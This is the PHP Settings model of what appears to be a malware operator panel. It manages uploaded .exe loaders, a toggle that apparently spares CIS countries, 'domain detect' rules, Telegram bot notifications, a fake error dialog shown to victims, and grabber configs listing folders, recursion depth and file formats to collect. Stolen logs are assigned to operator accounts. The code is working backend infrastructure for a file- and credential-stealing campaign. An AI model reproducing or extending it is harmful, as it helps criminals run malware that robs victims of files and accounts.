<?

namespace application\models;
use application\core\Model;
use application\core\View;
use application\lib\Answer;
use application\lib\TelegramService;
use \R;

class Settings extends Model {

	public function get_params_info() {
		return [
			"sng" => $this->user->sng,
		];
	}

	public function save_params($block_sng) {
		$this->user->sng = $block_sng?1:0;
		R::store($this->user);

		return new Answer();
	}

	public function get_loader_info() {
		$result = [];

		foreach($this->user->ownLoadersList as $loader)
			$result[] = $loader->name;

		return $result;
	}

	private function delete_loader() {
		foreach($this->user->ownLoadersList as $loader) {
			if(file_exists("application/files/loader/" . $loader->filename . ".exe"))
				unlink("application/files/loader/" . $loader->filename . ".exe");

			R::trash($loader);
		}
	}

	public function save_loader($files, $use) {
		$result = [];
		
		if($use) {
			$files_count = count($files['name']);
			$names = [];

			if($files_count > 0)
				$this->delete_loader();

			for($i = 0; $i < $files_count; $i++) {
				if($files["type"][$i] == "application/x-msdownload") {
					if(is_uploaded_file($files["tmp_name"][$i])) {

						$filename = "";
						do {
							$filename = $this->random_str(8);
						} while(file_exists($filename));
						

						if(move_uploaded_file($files["tmp_name"][$i], "application/files/loader/" . $filename . ".exe")) {

							$loader = R::dispense('loaders');

							$loader->name = $files['name'][$i];
							$loader->filename = $filename;

							$this->user->ownLoadersList[] = $loader;
							R::store($this->user);

							$result[] = (new Answer())->Return();
						}
						else {
							$result[] = (new Answer(false, "Не удалось переместить файл на сервер (" . $files["name"][$i] . ")"))->Return();
						}
					}
					else {
						$result[] = (new Answer(false, "Не удалось загрузить файл на сервер (" . $files["name"][$i] . ")"))->Return();
					}
				}
				else {
					$result[] = (new Answer(false, "Файл " . $files["name"][$i] . " неверного формата"))->Return();
				}
			}
		}
		else {
			$this->delete_loader();
			$result[] = (new Answer())->Return();
		}
		return $result;
	}

	public function get_dd_info($id) {
		$dd = current($this->user->withCondition("id = ?", [$id])->ownDdList);
		if($dd != null) {
			return [
				"domain" => $dd->domain,
				"type" => $dd->type
			];
		}
	}

	public function edit_dd($domain, $type, $id) {
		$dd = current($this->user->withCondition("id = ?", [$id])->ownDdList);
		if($dd != null) {
			$dd->domain = $domain;
			$dd->type = $type;

			R::store($this->user);
			return new Answer();
		}
		else
			return new Answer(false, "Выбранный вами doamin detect не существует");
	} 

	public function delete_dd($id) {
		$dd = current($this->user->withCondition("id = ?", [$id])->ownDdList);
		if($dd != null) {
			R::trash($dd);

			return new Answer();
		}
		else
			return new Answer(false, "Выбранный вами doamin detect не существует");
	}

	public function get_dd_table() {
		$result = [];

		foreach($this->user->ownDdList as $dd) {
			$result[] = [
				"domain" => $dd->domain,
				"type" => $dd->type,
				"id" => $dd->id,
			];
		}

		return ["data" => $result];
	}

	public function save_dd($domain, $type) {
		if($domain != "" && $type != "") {
			$dd = R::dispense("dd");

			$dd->domain = $domain;
			$dd->type = $type;

			$this->user->ownDdList[] = $dd;
			R::store($this->user);

			return new Answer();
		}
		else
			return new Answer(false, "Вы заполнили не все поля");
	}

	public function get_telegram_data() {
		$result = [];
		$tel = current($this->user->ownTelegramsList);

		if($tel != null) {
			$result = [
				"token" => $tel->token,
				"username" => $tel->username,
				"fa" => $this->user->fa,
				"send" => $this->user->send,
			];
		}

		return $result;
	}

	public function save_telegram($token, $username, $fa, $send) {
		if($token != "" && $username != "") {
			$tel = current($this->user->ownTelegramsList);
			if($tel == null) {
				$tel = R::dispense("telegrams");

				$tel->token = $token;
				$tel->username = $username;
				$tel->chatid = null;
			}
			
			$this->user->fa = $fa=="true"?1:0;
			$this->user->send = $send == "true"?1:0;

			$this->user->ownTelegramsList[] = $tel;
			R::store($this->user);

			$telegram = new TelegramService($token);
			if($telegram->setWebhook()) {

				return new Answer();
			}
			else
				return new Answer(false, "Ошибка установка webhook'a: \"" . $telegram->getError() . "\"");
		}
		else 
			return new Answer(false, "Вы заполнили не все поля");
	} 

	public function get_fake_error() {
		$result = [];

		$err = current($this->user->ownErrorsList);

		if($err != null) {
			$result[] = [
				"use" => $err->use,
				"header" => $err->title,
				"text" => $err->text,
				"type" => $err->type,
			];
		}
		

		return $result;
	}

	public function create_account($login, $pass) {
		if($this->user->admin == 1) {
			if(strlen($login) >= 6) {
				if(strlen($pass) >= 8) {
					$ex = R::findOne("accounts", "login = ?", [$login]);
					if($ex == null) {
						$user = R::dispense("accounts");

						$user->login = $login;
						$user->password = password_hash($pass, PASSWORD_DEFAULT);
						$user->date = time();
						$user->admin = 0;

						R::store($user);
						return new Answer();
					}
					else {
						return new Answer(false, "Пользователь с таким логином уже существует");
					}
				}
				else {
					return new Answer(false, "Пароль должен быть больше 8 символов");
				}
			}
			else {
				return new Answer(false, "Логин должен быть больше 6 символов");
			}
		}
		else {
			return new Answer(false, "У вас недостаточно прав для сохдания пользователя");
		}
	}

	public function delete_account($id) {
		if($this->user->id == $id xor $this->user->admin == 1) {
			$user = R::findOne("accounts", "id = ?", [$id]);
			$admin = R::findOne("accounts", "admin = ?", [1]);

			if($user != null) {
				foreach ($user->ownLogsList as $log) {
					if($this->user->id != $id)
						$this->user->ownLogsList[] = $log;
					else {
						if($admin != null) {
							$admin->ownLogsList[] = $log;
						}
					}
				}

				R::store($this->user);
				R::store($admin);

				R::trash($user);
				return new Answer();
			}
			else {
				return new Answer(false, "Запрашиваемый пользователь не найден");
			}
		}
		else {
			return new Answer(false, "У вас недостаточно прав для удаления этого пользователя");
		}
	}

	public function save_account($id, $login, $password) {
		if(strlen($login) >= 6) {
			if(strlen($password) >= 8 || $password == "") {
				if(!isset($id)) {
					// Current accounts

					$this->user->login = $login;
					if($password != "")
						$this->user->password = password_hash($password, PASSWORD_DEFAULT);

					R::store($this->user);
					return new Answer();
				}
				else {
					if($this->user->admin == 1) {
						$ex = R::findOne("accounts", "login = ?", [$login]);
						if($ex == null || $ex->id == $id) {
							$user = R::findOne("accounts", "id = ?", [$id]);
							if($user != null) {
								$user->login = $login;
								if($password != "")
									$user->password = password_hash($password, PASSWORD_DEFAULT);

								R::store($user);
								return new Answer();
							}
							else {
								return new Answer(false, "Запрашиваемый пользователь не найден");
							}
						}
						else {
							return new Answer(false, "Пользователь с таким логином уже существует");
						}
					}
					else {
						return new Answer(false, "У вас недостаточно прав для изменения этого пользователя");
					}
				}
			}
			else {
				return new Answer(false, "Пароль должен быть больше 8 символов");
			}
		}
		else {
			return new Answer(false, "Логин должен быть больше 6 символов");
		}

	}
	
	public function edit_config($id, $data) {
		$config = current($this->user->withCondition("id = ?", [$id])->ownConfigsList);

		if($config != null) {
			if($data["recursive"] == 'true')
				if($data["rcount"] == "")
					return new Answer(false, "Вы не ввели дальность рекурсии");

			$config->name = $data["name"];
			$config->path = $data["path"];
			$config->size = $data["size"];
			$config->recursive = $data["recursive"];
			$config->rc = $data["rcount"];
			$config->formats = json_encode($data["formats"]);

			R::store($this->user);

			return new Answer();
		} 
		return new Answer(false, "Выбранный вами конфиг не существует");
	}

	public function info_config($id) {
		$config = current($this->user->withCondition("id = ?", [$id])->ownConfigsList);
		if($config != null) {
			return new Answer(true, "", 
				[
					"name" => $config->name,
					"path" => $config->path,
					"size" => $config->size,
					"recursive" => $config->recursive,
					"rcount" => $config->rc,
					"formats" => json_decode($config->formats),
				]);
		}
		else {
			return new Answer(false, "Выбранный вами конфиг не существует");
		}
	} 

	public function delete_config($id) {
		$config = current($this->user->withCondition("id = ?", [$id])->ownConfigsList);
		if($config != null) {
			R::trash($config);

			return new Answer();
		}
		else {
			return new Answer(false, "Выбранный вами конфиг не существует");
		}
	}

	public function get_accounts_table() {
		$result = [];

		foreach(R::find("accounts") as $account) {
			$result[] = [
				"id" => $account->id,
				"login" => $account->login,
				"admin" => $account->admin,
				"date" => date("Y-m-d H:m", $account->date),
				"data" => [ $account->id, $account->login ],
			];
		}

		return ["data" => $result];
	}

	public function get_folder_table() {
		$result = [];

		foreach($this->user->ownConfigsList as $conf) {
			$result[] = [
				"id" => $conf->id,
				"name" => $conf->name,
				"path" => $conf->path,
				"size" => $conf->size,
				"recursive" => $conf->recursive,
				"rcount" => $conf->rc,
				"formats" => json_decode($conf->formats),
			];
		}

		return ["data" => $result];
	}

	public function save_dirs($name, $path, $recursive, $rcount, $size, $formats) {


		if($name != "" && $path != "" && $recursive != "" && $size != "") {
			if($recursive == 'true')
				if($rcount == "")
					return new Answer(false, "Вы не ввели дальность рекурсии");

			$config = R::dispense("configs");

			$config->name = $name;
			$config->path = $path;
			$config->size = $size;
			$config->recursive = $recursive;
			$config->rc = $rcount;
			$config->formats = json_encode($formats);

			$this->user->ownConfigsList[] = $config;
			R::store($this->user);

			return new Answer();
		}
		else 
			return new Answer(false, "Вы заполнили не все поля");
	}

	public function save_fe($header, $text, $type, $use) {
		if($use == "true") {
			if(!empty($header) && !empty($text) && !empty($type)) {
				$error = current($this->user->ownErrorsList);

				if($error == null)
					$error = R::dispense("errors");

				$error->use = 1;
				$error->text = $text;
				$error->title = $header;
				$error->type = $type;

				$this->user->ownErrorsList[] = $error;

				R::store($this->user);
				return new Answer();
			}
			else 
				return new Answer(false, "Вы не заполнили все поля");
		}
		else {
			current($this->user->ownErrorsList)->use = 0;
			R::store($this->user);

			return new Answer();
		}
	}
}